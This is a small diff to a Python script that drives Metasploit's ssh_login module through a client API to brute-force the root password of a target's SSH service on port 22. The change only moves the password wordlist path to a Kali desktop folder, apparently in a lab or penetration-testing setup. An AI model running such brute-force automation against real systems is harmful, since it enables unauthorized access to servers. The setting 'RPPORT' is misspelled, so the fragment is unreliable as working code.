@@ -27,7 +27,7 @@ def main(argv):
     time.sleep(2)
     # put the attack launch command
     auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
-    auxiliary['PASS_FILE'] = "/usr/share/wordlists/unix_passwords_modified.txt"
+    auxiliary['PASS_FILE'] = "/home/kali/Desktop/reinstall/unix_passwords_modified.txt"
     auxiliary['USERNAME'] = "root"
     auxiliary['RHOST'] = target_ip
     auxiliary['RPPORT'] = 22
